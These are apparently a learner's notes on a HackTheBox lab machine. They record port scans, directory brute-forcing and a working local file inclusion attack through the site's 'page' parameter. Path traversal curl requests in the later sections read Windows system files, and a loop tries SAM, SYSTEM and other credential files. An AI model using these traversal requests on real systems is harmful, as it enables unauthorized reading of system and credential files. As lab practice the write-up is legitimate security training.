nmap is *crawling*........
```
┌──(kali㉿kali)-[~]
└─$ nmap -T5 -Pn -p- --open 10.129.80.95
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-07 20:14 MDT
Stats: 0:02:26 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 4.40% done; ETC: 21:09 (0:52:51 remaining)

┌──(kali㉿kali)-[~]
└─$ curl 10.129.80.95
<meta http-equiv="refresh" content="0;url=http://unika.htb/">  
```

Resetting the machine......
# nmap

### nmap scan 0: first 1,000 ports
```
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -Pn --open 10.129.245.14 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-07 20:34 MDT
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 24.00% done; ETC: 20:36 (0:01:19 remaining)
Nmap scan report for unika.htb (10.129.245.14)
Host is up (0.057s latency).
Not shown: 999 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 61.90 seconds

```
### nmap scan 1: "quick", all ports 
```
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -Pn -p- --open 10.129.245.14
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-07 20:23 MDT
Stats: 0:01:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 31.24% done; ETC: 20:26 (0:02:14 remaining)
Stats: 0:04:48 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan

<SNIP>

SYN Stealth Scan Timing: About 98.13% done; ETC: 20:59 (0:00:40 remaining)
Nmap scan report for 10.129.245.14
Host is up (0.047s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 2165.65 seconds              
```

### nmap scan 2: service version
```
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -sV -sC -p 80,5985,7680 10.129.245.14 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-07 21:02 MDT
Nmap scan report for unika.htb (10.129.245.14)
Host is up (0.049s latency).

PORT     STATE    SERVICE   VERSION
80/tcp   open     http      Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Unika
5985/tcp open     http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp filtered pando-pub
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.30 seconds

```

# Wappalyzer
- PHP 8.1.1
- JQuery 1.11.1

# Gobuster
## gobuster - quick, php
```
┌──(kali㉿kali)-[~/Desktop/HackTheBox]
└─$ gobuster dir -u http://unika.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://unika.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.php        (Status: 403) [Size: 298]
/.hta                 (Status: 403) [Size: 298]
/.hta.php             (Status: 403) [Size: 298]
/.htaccess            (Status: 403) [Size: 298]
/.htpasswd            (Status: 403) [Size: 298]
/.htpasswd.php        (Status: 403) [Size: 298]
/Index.php            (Status: 200) [Size: 46453]
/aux.php              (Status: 403) [Size: 298]
/aux                  (Status: 403) [Size: 298]
/cgi-bin/             (Status: 403) [Size: 298]
/com1                 (Status: 403) [Size: 298]
/com3                 (Status: 403) [Size: 298]
/com2                 (Status: 403) [Size: 298]
/com3.php             (Status: 403) [Size: 298]
/com2.php             (Status: 403) [Size: 298]
/com1.php             (Status: 403) [Size: 298]
/com4                 (Status: 403) [Size: 298]
/com4.php             (Status: 403) [Size: 298]
/con                  (Status: 403) [Size: 298]
/con.php              (Status: 403) [Size: 298]
/css                  (Status: 301) [Size: 328] [--> http://unika.htb/css/]
/examples             (Status: 503) [Size: 398]
/img                  (Status: 301) [Size: 328] [--> http://unika.htb/img/]
/inc                  (Status: 301) [Size: 328] [--> http://unika.htb/inc/]
/index.php            (Status: 200) [Size: 46453]
/index.php            (Status: 200) [Size: 46453]
/js                   (Status: 301) [Size: 327] [--> http://unika.htb/js/]
/licenses             (Status: 403) [Size: 417]
/lpt2.php             (Status: 403) [Size: 298]
/lpt1                 (Status: 403) [Size: 298]
/lpt1.php             (Status: 403) [Size: 298]
/lpt2                 (Status: 403) [Size: 298]
/nul                  (Status: 403) [Size: 298]
/nul.php              (Status: 403) [Size: 298]
/phpmyadmin           (Status: 403) [Size: 417]
/prn                  (Status: 403) [Size: 298]
/prn.php              (Status: 403) [Size: 298]
/server-status        (Status: 403) [Size: 417]
/server-info          (Status: 403) [Size: 417]
/webalizer            (Status: 403) [Size: 417]
Progress: 9500 / 9500 (100.00%)
===============================================================
Finished
===============================================================

```

### gobuster - medium, php, html
```
┌──(kali㉿kali)-[~/Desktop/HackTheBox]
└─$ gobuster dir -u http://unika.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://unika.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 298]
/index.php            (Status: 200) [Size: 46453]
/img                  (Status: 301) [Size: 328] [--> http://unika.htb/img/]
/english.html         (Status: 200) [Size: 46453]
/css                  (Status: 301) [Size: 328] [--> http://unika.htb/css/]
/Index.php            (Status: 200) [Size: 46453]
/js                   (Status: 301) [Size: 327] [--> http://unika.htb/js/]
/examples             (Status: 503) [Size: 398]
/french.html          (Status: 200) [Size: 47199]
/English.html         (Status: 200) [Size: 46453]
/german.html          (Status: 200) [Size: 46984]
/licenses             (Status: 403) [Size: 417]
/inc                  (Status: 301) [Size: 328] [--> http://unika.htb/inc/]
/%20                  (Status: 403) [Size: 298]
/IMG                  (Status: 301) [Size: 328] [--> http://unika.htb/IMG/]
/INDEX.php            (Status: 200) [Size: 46453]
/French.html          (Status: 200) [Size: 47199]
/*checkout*           (Status: 403) [Size: 298]
/*checkout*.php       (Status: 403) [Size: 298]
/*checkout*.html      (Status: 403) [Size: 298]
/CSS                  (Status: 301) [Size: 328] [--> http://unika.htb/CSS/]
/Img                  (Status: 301) [Size: 328] [--> http://unika.htb/Img/]
/JS                   (Status: 301) [Size: 327] [--> http://unika.htb/JS/]
/German.html          (Status: 200) [Size: 46984]
/phpmyadmin           (Status: 403) [Size: 417]
/webalizer            (Status: 403) [Size: 417]
/*docroot*            (Status: 403) [Size: 298]
/*docroot*.php        (Status: 403) [Size: 298]
/*docroot*.html       (Status: 403) [Size: 298]
/*                    (Status: 403) [Size: 298]
/*.html               (Status: 403) [Size: 298]
/*.php                (Status: 403) [Size: 298]
/con.html             (Status: 403) [Size: 298]
/con                  (Status: 403) [Size: 298]
/con.php              (Status: 403) [Size: 298]
Progress: 62678 / 661683 (9.47%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 62688 / 661683 (9.47%)
===============================================================
Finished
```


# wfuzz
```
┌──(kali㉿kali)-[~/Desktop/HackTheBox]
└─$ wfuzz -c -z file,/usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt  -u http://unika.htb/index.php?page=FUZZ

No results
```

### manual attempts at finding LFI
After some manual attempts, there are files visible on the machine through LFI
```
┌──(kali㉿kali)-[~]
└─$ curl -s http://unika.htb/?page=../../windows/system32/drivers/etc/hosts
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
                                   
```

Searching for more results in etc:
```
┌──(kali㉿kali)-[~]
└─$ for item in services protocol hosts passwd group networks logon.log httpd.conf SAM SYSTEM; do echo "##### $item results ######: "; echo ""; curl -s http://unika.htb/?page=../../windows/system32/drivers/etc/$item; done  | grep -Ev "failed|br"

##### services results ######: 

# Copyright (c) 1993-2004 Microsoft Corp.
#
# This file contains port numbers for well-known services defined by IANA
#
# Format:
#
# <service name>  <port number>/<protocol>  [aliases...]   [#<comment>]
#

echo                7/tcp
echo                7/udp
discard             9/tcp    sink null
discard             9/udp    sink null
systat             11/tcp    users                  #Active users
systat             11/udp    users                  #Active users
daytime            13/tcp
daytime            13/udp
qotd               17/tcp    quote                  #Quote of the day
qotd               17/udp    quote                  #Quote of the day
chargen            19/tcp    ttytst source          #Character generator
chargen            19/udp    ttytst source          #Character generator
ftp-data           20/tcp                           #FTP, data
ftp                21/tcp                           #FTP. control
ssh                22/tcp                           #SSH Remote Login Protocol
telnet             23/tcp
smtp               25/tcp    mail                   #Simple Mail Transfer Protocol
time               37/tcp    timserver
time               37/udp    timserver
rlp                39/udp    resource               #Resource Location Protocol
nameserver         42/tcp    name                   #Host Name Server
nameserver         42/udp    name                   #Host Name Server
nicname            43/tcp    whois
domain             53/tcp                           #Domain Name Server
domain             53/udp                           #Domain Name Server
bootps             67/udp    dhcps                  #Bootstrap Protocol Server
bootpc             68/udp    dhcpc                  #Bootstrap Protocol Client
tftp               69/udp                           #Trivial File Transfer
gopher             70/tcp
finger             79/tcp
http               80/tcp    www www-http           #World Wide Web
hosts2-ns          81/tcp                           #HOSTS2 Name Server
hosts2-ns          81/udp                           #HOSTS2 Name Server
kerberos           88/tcp    krb5 kerberos-sec      #Kerberos
kerberos           88/udp    krb5 kerberos-sec      #Kerberos
hostname          101/tcp    hostnames              #NIC Host Name Server
iso-tsap          102/tcp                           #ISO-TSAP Class 0
rtelnet           107/tcp                           #Remote Telnet Service
pop2              109/tcp    postoffice             #Post Office Protocol - Version 2
pop3              110/tcp                           #Post Office Protocol - Version 3
sunrpc            111/tcp    rpcbind portmap        #SUN Remote Procedure Call
sunrpc            111/udp    rpcbind portmap        #SUN Remote Procedure Call
auth              113/tcp    ident tap              #Identification Protocol
uucp-path         117/tcp
sqlserv           118/tcp                           #SQL Services
nntp              119/tcp    usenet                 #Network News Transfer Protocol
ntp               123/udp                           #Network Time Protocol
epmap             135/tcp    loc-srv                #DCE endpoint resolution
epmap             135/udp    loc-srv                #DCE endpoint resolution
netbios-ns        137/tcp    nbname                 #NETBIOS Name Service
netbios-ns        137/udp    nbname                 #NETBIOS Name Service
netbios-dgm       138/udp    nbdatagram             #NETBIOS Datagram Service
netbios-ssn       139/tcp    nbsession              #NETBIOS Session Service
imap              143/tcp    imap4                  #Internet Message Access Protocol
sql-net           150/tcp
sqlsrv            156/tcp
pcmail-srv        158/tcp                           #PCMail Server
snmp              161/udp                           #SNMP
snmptrap          162/udp    snmp-trap              #SNMP trap
print-srv         170/tcp                           #Network PostScript
bgp               179/tcp                           #Border Gateway Protocol
irc               194/tcp                           #Internet Relay Chat Protocol        
ipx               213/udp                           #IPX over IP
rtsps             322/tcp
rtsps             322/udp
mftp              349/tcp
mftp              349/udp
ldap              389/tcp                           #Lightweight Directory Access Protocol
https             443/tcp    MCom                   #HTTP over TLS/SSL
https             443/udp    MCom                   #HTTP over TLS/SSL
microsoft-ds      445/tcp
microsoft-ds      445/udp
kpasswd           464/tcp                           # Kerberos (v5)
kpasswd           464/udp                           # Kerberos (v5)
isakmp            500/udp    ike                    #Internet Key Exchange
crs               507/tcp                           #Content Replication System
crs               507/udp                           #Content Replication System
exec              512/tcp                           #Remote Process Execution
biff              512/udp    comsat
login             513/tcp                           #Remote Login
who               513/udp    whod
cmd               514/tcp    shell
syslog            514/udp
printer           515/tcp    spooler
talk              517/udp
ntalk             518/udp
efs               520/tcp                           #Extended File Name Server
router            520/udp    route routed
ulp               522/tcp    
ulp               522/udp    
timed             525/udp    timeserver
tempo             526/tcp    newdate
irc-serv          529/tcp
irc-serv          529/udp
courier           530/tcp    rpc
conference        531/tcp    chat
netnews           532/tcp    readnews
uucp              540/tcp    uucpd
klogin            543/tcp                           #Kerberos login
kshell            544/tcp    krcmd                  #Kerberos remote shell
dhcpv6-client     546/tcp                           #DHCPv6 Client
dhcpv6-client     546/udp                           #DHCPv6 Client
dhcpv6-server     547/tcp                           #DHCPv6 Server
dhcpv6-server     547/udp                           #DHCPv6 Server
afpovertcp        548/tcp                           #AFP over TCP
afpovertcp        548/udp                           #AFP over TCP
new-rwho          550/udp    new-who
rtsp              554/tcp                           #Real Time Stream Control Protocol
rtsp              554/udp                           #Real Time Stream Control Protocol
remotefs          556/tcp    rfs rfs_server
rmonitor          560/udp    rmonitord
monitor           561/udp
nntps             563/tcp    snntp                  #NNTP over TLS/SSL
nntps             563/udp    snntp                  #NNTP over TLS/SSL
whoami            565/tcp
whoami            565/udp
ms-shuttle        568/tcp                           #Microsoft shuttle
ms-shuttle        568/udp                           #Microsoft shuttle
ms-rome           569/tcp                           #Microsoft rome
ms-rome           569/udp                           #Microsoft rome
http-rpc-epmap    593/tcp                           #HTTP RPC Ep Map
http-rpc-epmap    593/udp                           #HTTP RPC Ep Map
hmmp-ind          612/tcp                           #HMMP Indication
hmmp-ind          612/udp                           #HMMP Indication
hmmp-op           613/tcp                           #HMMP Operation
hmmp-op           613/udp                           #HMMP Operation
ldaps             636/tcp    sldap                  #LDAP over TLS/SSL
doom              666/tcp                           #Doom Id Software
doom              666/udp                           #Doom Id Software
msexch-routing    691/tcp                           #MS Exchange Routing
msexch-routing    691/udp                           #MS Exchange Routing
kerberos-adm      749/tcp                           #Kerberos administration
kerberos-adm      749/udp                           #Kerberos administration
kerberos-iv       750/udp                           #Kerberos version IV
mdbs_daemon       800/tcp
mdbs_daemon       800/udp
ftps-data         989/tcp                           #FTP data, over TLS/SSL
ftps              990/tcp                           #FTP control, over TLS/SSL
telnets           992/tcp                           #Telnet protocol over TLS/SSL
imaps             993/tcp                           #IMAP4 protocol over TLS/SSL
ircs              994/tcp                           #IRC protocol over TLS/SSL
pop3s             995/tcp    spop3                  #pop3 protocol over TLS/SSL (was spop3)
pop3s             995/udp    spop3                  #pop3 protocol over TLS/SSL (was spop3)
kpop             1109/tcp                           #Kerberos POP
nfsd-status      1110/tcp                           #Cluster status info
nfsd-keepalive   1110/udp                           #Client status info
nfa              1155/tcp                           #Network File Access
nfa              1155/udp                           #Network File Access
activesync       1034/tcp                           #ActiveSync Notifications
phone            1167/udp                           #Conference calling
opsmgr           1270/tcp                           #Microsoft Operations Manager
opsmgr           1270/udp                           #Microsoft Operations Manager
ms-sql-s         1433/tcp                           #Microsoft-SQL-Server 
ms-sql-s         1433/udp                           #Microsoft-SQL-Server 
ms-sql-m         1434/tcp                           #Microsoft-SQL-Monitor
ms-sql-m         1434/udp                           #Microsoft-SQL-Monitor                
ms-sna-server    1477/tcp
ms-sna-server    1477/udp
ms-sna-base      1478/tcp
ms-sna-base      1478/udp
wins             1512/tcp                           #Microsoft Windows Internet Name Service
wins             1512/udp                           #Microsoft Windows Internet Name Service
ingreslock       1524/tcp    ingres
stt              1607/tcp
stt              1607/udp
l2tp             1701/udp                           #Layer Two Tunneling Protocol
pptconference    1711/tcp
pptconference    1711/udp
pptp             1723/tcp                           #Point-to-point tunnelling protocol
msiccp           1731/tcp
msiccp           1731/udp
remote-winsock   1745/tcp
remote-winsock   1745/udp
ms-streaming     1755/tcp
ms-streaming     1755/udp
msmq             1801/tcp                           #Microsoft Message Queue
msmq             1801/udp                           #Microsoft Message Queue
radius           1812/udp                           #RADIUS authentication protocol
radacct          1813/udp                           #RADIUS accounting protocol
msnp             1863/tcp
msnp             1863/udp
ssdp             1900/tcp
ssdp             1900/udp
close-combat     1944/tcp
close-combat     1944/udp
nfsd             2049/udp    nfs                    #NFS server
knetd            2053/tcp                           #Kerberos de-multiplexor
mzap             2106/tcp                           #Multicast-Scope Zone Announcement Protocol
mzap             2106/udp                           #Multicast-Scope Zone Announcement Protocol
qwave            2177/tcp                           #QWAVE
qwave            2177/udp                           #QWAVE Experiment Port
directplay       2234/tcp                           #DirectPlay
directplay       2234/udp                           #DirectPlay
ms-olap3         2382/tcp                           #Microsoft OLAP 3
ms-olap3         2382/udp                           #Microsoft OLAP 3
ms-olap4         2383/tcp                           #Microsoft OLAP 4
ms-olap4         2383/udp                           #Microsoft OLAP 4
ms-olap1         2393/tcp                           #Microsoft OLAP 1
ms-olap1         2393/udp                           #Microsoft OLAP 1
ms-olap2         2394/tcp                           #Microsoft OLAP 2
ms-olap2         2394/udp                           #Microsoft OLAP 2
ms-theater       2460/tcp
ms-theater       2460/udp
wlbs             2504/tcp                           #Microsoft Windows Load Balancing Server
wlbs             2504/udp                           #Microsoft Windows Load Balancing Server
ms-v-worlds      2525/tcp                           #Microsoft V-Worlds 
ms-v-worlds      2525/udp                           #Microsoft V-Worlds 
sms-rcinfo       2701/tcp                           #SMS RCINFO
sms-rcinfo       2701/udp                           #SMS RCINFO
sms-xfer         2702/tcp                           #SMS XFER
sms-xfer         2702/udp                           #SMS XFER
sms-chat         2703/tcp                           #SMS CHAT
sms-chat         2703/udp                           #SMS CHAT
sms-remctrl      2704/tcp                           #SMS REMCTRL
sms-remctrl      2704/udp                           #SMS REMCTRL
msolap-ptp2      2725/tcp                           #MSOLAP PTP2
msolap-ptp2      2725/udp                           #MSOLAP PTP2
icslap           2869/tcp
icslap           2869/udp
cifs             3020/tcp
cifs             3020/udp
xbox             3074/tcp                           #Microsoft Xbox game port
xbox             3074/udp                           #Microsoft Xbox game port
ms-dotnetster    3126/tcp                           #Microsoft .NET ster port
ms-dotnetster    3126/udp                           #Microsoft .NET ster port
ms-rule-engine   3132/tcp                           #Microsoft Business Rule Engine Update Service
ms-rule-engine   3132/udp                           #Microsoft Business Rule Engine Update Service
msft-gc          3268/tcp                           #Microsoft Global Catalog
msft-gc          3268/udp                           #Microsoft Global Catalog
msft-gc-ssl      3269/tcp                           #Microsoft Global Catalog with LDAP/SSL
msft-gc-ssl      3269/udp                           #Microsoft Global Catalog with LDAP/SSL
ms-cluster-net   3343/tcp                           #Microsoft Cluster Net
ms-cluster-net   3343/udp                           #Microsoft Cluster Net
ms-wbt-server    3389/tcp                           #MS WBT Server
ms-wbt-server    3389/udp                           #MS WBT Server
ms-la            3535/tcp                           #Microsoft Class Server
ms-la            3535/udp                           #Microsoft Class Server
pnrp-port        3540/tcp                           #PNRP User Port
pnrp-port        3540/udp                           #PNRP User Port
teredo           3544/tcp                           #Teredo Port
teredo           3544/udp                           #Teredo Port
p2pgroup         3587/tcp                           #Peer to Peer Grouping
p2pgroup         3587/udp                           #Peer to Peer Grouping
ws-discovery     3702/udp                           #WS-Discovery
ws-discovery     3702/tcp                           #WS-Discovery
dvcprov-port     3776/tcp                           #Device Provisioning Port
dvcprov-port     3776/udp                           #Device Provisioning Port
msfw-control     3847/tcp                           #Microsoft Firewall Control
msdts1           3882/tcp                           #DTS Service Port
sdp-portmapper   3935/tcp                           #SDP Port Mapper Protocol
sdp-portmapper   3935/udp                           #SDP Port Mapper Protocol
net-device       4350/tcp                           #Net Device
net-device       4350/udp                           #Net Device
ipsec-msft       4500/tcp                           #Microsoft IPsec NAT-T
ipsec-msft       4500/udp                           #Microsoft IPsec NAT-T
llmnr            5355/tcp                           #LLMNR 
llmnr            5355/udp                           #LLMNR 
wsd              5357/tcp                           #Web Services on devices 
wsd              5358/tcp                           #Web Services on devices
rrac             5678/tcp                           #Remote Replication Agent Connection
rrac             5678/udp                           #Remote Replication Agent Connection
dccm             5679/tcp                           #Direct Cable Connect Manager
dccm             5679/udp                           #Direct Cable Connect Manager
ms-licensing     5720/tcp                           #Microsoft Licensing
ms-licensing     5720/udp                           #Microsoft Licensing 
directplay8      6073/tcp                           #DirectPlay8
directplay8      6073/udp                           #DirectPlay8
ms-do            7680/tcp                           #Microsoft Delivery Optimization
ms-do            7680/udp                           #Microsoft Delivery Optimization
man              9535/tcp                           #Remote Man Server
rasadv           9753/tcp
rasadv           9753/udp
imip-channels   11320/tcp                           #IMIP Channels Port
imip-channels   11320/udp                           #IMIP Channels Port
directplaysrvr  47624/tcp                           #Direct Play Server
directplaysrvr  47624/udp                           #Direct Play Server

##### protocol results ######: 

# Copyright (c) 1993-2006 Microsoft Corp.
#
# This file contains the Internet protocols as defined by various
# RFCs.  See http://www.iana.org/assignments/protocol-numbers 
#
# Format:
#
# <protocol name>  <assigned number>  [aliases...]   [#<comment>]

ip         0     IP           # Internet protocol
icmp       1     ICMP         # Internet control message protocol
ggp        3     GGP          # Gateway-gateway protocol
tcp        6     TCP          # Transmission control protocol
egp        8     EGP          # Exterior gateway protocol
pup        12    PUP          # PARC universal packet protocol
udp        17    UDP          # User datagram protocol
hmp        20    HMP          # Host monitoring protocol
xns-idp    22    XNS-IDP      # Xerox NS IDP
rdp        27    RDP          # "reliable datagram" protocol
ipv6       41    IPv6         # Internet protocol IPv6
ipv6-route 43    IPv6-Route   # Routing header for IPv6
ipv6-frag  44    IPv6-Frag    # Fragment header for IPv6
esp        50    ESP          # Encapsulating security payload
ah         51    AH           # Authentication header
ipv6-icmp  58    IPv6-ICMP    # ICMP for IPv6
ipv6-nonxt 59    IPv6-NoNxt   # No next header for IPv6
ipv6-opts  60    IPv6-Opts    # Destination options for IPv6
rvd        66    RVD          # MIT remote virtual disk##### hosts results ######: 

# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
##### passwd results ######: 

##### group results ######: 

##### networks results ######: 

# Copyright (c) 1993-1999 Microsoft Corp.
#
# This file contains network name/network number mappings for 
# local networks. Network numbers are recognized in dotted decimal form.
#
# Format:
#
# <network name>  <network number>     [aliases...]  [#<comment>]
#
# For example:
#
#    loopback     127
#    campus       284.122.107
#    london       284.122.108

loopback                 127
##### logon.log results ######: 

##### httpd.conf results ######: 

##### SAM results ######: 

##### SYSTEM results ######: 


```

### LFI - quick flag search
```
┌──(kali㉿kali)-[~]
└─$ curl -s http://unika.htb/?page=../../users/administrator/desktop/flag.txt | grep -Ev 'br|Failed'
                                                                             
┌──(kali㉿kali)-[~]
└─$ curl -s http://unika.htb/?page=../../C:/users/administrator/desktop/flag.txt | grep -Ev 'br|Failed'
                          
```
